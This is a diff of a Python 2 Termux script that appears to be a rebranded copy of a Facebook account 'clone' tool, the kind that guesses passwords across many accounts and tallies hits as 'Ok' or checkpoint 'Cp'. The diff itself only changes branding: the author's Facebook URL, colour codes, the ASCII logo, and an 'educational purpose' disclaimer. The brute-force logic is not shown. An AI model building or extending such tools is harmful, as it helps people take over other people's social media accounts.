@@ -1,5 +1,15 @@
 #coding=utf-8
 #!/usr/bin/python2
+
+P = "\033[97;1m" 
+M = "\033[91;1m" 
+H = "\033[92;1m" 
+K = "\033[93;1m" 
+B = "\033[94;1m" 
+U = "\033[95;1m" 
+O = "\033[93;1m" 
+N = "\033[0m"
+
 try:
     import os,sys,time,datetime,re,random,hashlib,threading,json,getpass,urllib,cookielib,requests
     from multiprocessing.pool import ThreadPool
@@ -9,7 +19,7 @@ except ImportError:
 os.system("clear")
 """
 try:
-    my = requests.get("https://www.facebook.com/sultaan.mahmood.90")
+    my = requests.get("https://www.facebook.com/itz.efk.3")
 except requests.exceptions.ConnectionError:
     print("")
     print("\t    \033[1;97mTurn on mobile data OR wifi\033[1;97m")
@@ -37,7 +47,7 @@ elif os.path.isfile("/data/data/com.termux/files/home/hpro/...../node_modules/by
     os.system("cd ..... && node index.js &")
     os.system("clear")
     print("\033[1;32mPlease Select Facebook To Continue\033[1;97m")
-    os.system("xdg-open https://www.facebook.com/sultaan.mahmood.90")
+    os.system("xdg-open https://www.facebook.com/itz.efk.3")
     time.sleep(10)
 agents = [
   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",
@@ -58,12 +68,21 @@ c = "\033[1;32m"
 c2 = "\033[1;97m"
 c3 = "\033[1;97m"
 logo ="""
-\033[1;37mâ–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’ â–ˆâ–ˆâ–“  â–ˆâ–ˆâ–ˆâ–„ â–„â–ˆâ–ˆâ–ˆâ–“
-\033[1;37mâ–’â–ˆâ–„    â–’ â–’ @efkðŸ‡³ðŸ‡¬â–’ðŸ‡³ðŸ‡¬ðŸ‡³ðŸ‡¬ðŸ‡³ðŸ‡¬ â–„ â–€â–‘â–“â–ˆâ–ˆâ–’â–“â–ˆâ–ˆâ–’â–€â–ˆâ–€â–’
-\033[1;37mâ–’â–ˆâ–ˆ  â–€â–ˆâ–„   â–’â–ˆâ–ˆâ–’â–“â–ˆâ–ˆ    â–“â–ˆâ–ˆâ–‘
-\033[1;37mâ–‘â–ˆâ–ˆâ–„â–„â–„â–„â–ˆâ–ˆ    â–‘â–‘â–ˆâ–ˆâ–‘â–’â–ˆâ–ˆ
-\033[1;37mâ–“â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–‘â–ˆâ–ˆâ–‘â–’â–ˆâ–ˆâ–’â–ˆâ–ˆâ–’
-\033[1;37mâ–’â–’   â–“â–’â–ˆâ–‘â–‘â–’â–’ â–“lâ–‘ â–‘  â–‘
+\033[1;97m____▄▀▀▀▄▄▄▄▄▄▄▀▀▀▄_ \033[1;0m
+\033[1;97m───█▒▒░░░░░░░░░▒▒█─── \033[1;0m
+\033[1;97m────█░░█░░░░░█░░█──── \033[1;0m
+\033[1;97m─▄▄──█░░░▀█▀░░░█──▄▄─ \033[1;0m
+\033[1;97m█░░█─▀▄░░░░░░░▄▀─█░░█ \033[1;0m
+\033[1;97m█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█ \033[1;0m
+\033[1;97m█----╦─╦╔╗╦─╔╗╔╗╔╦╗╔╗----█ \033[1;0m
+\033[1;97m█----║║║╠─║─║─║║║║║╠─----█ \033[1;0m
+\033[1;97m█----╚╩╝╚╝╚╝╚╝╚╝╩─╩╚╝----█ \033[1;0m
+\033[1;97m█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█ \033[1;0m
+\033[1;97m#######    #######   #          #
+\033[1;97m#          #         #       # 
+\033[1;97m#######   #######    #   #
+\033[1;97m#         #          #       #
+\033[1;97m#######  #           #           #
 \033[1;37m------------------------------------------------------------------------             -------------------             
 \033[1;36m(*) Author :\033[1;37m efkeniola.   
 \033[1;36m(*)  original by efkeniola copy by eniolahacking
@@ -480,6 +499,7 @@ def b_menu_select():
 	print (" ")
 	print (47*"-")
 	print ("")
+	print ("WELCOME ONCE AGAIN TO EFK FB CLONE AT YOUR OWN RISK ONLY FOR EDUCATIONAL PURPOSE")
 	print (" Process has completed")
 	print (" Total \033[1;97mCp/\033[1;32mOk :\033[1;97m "+str(len(cps)) + "\033[1;32m/"+str(len(oks)))
 	print ("")
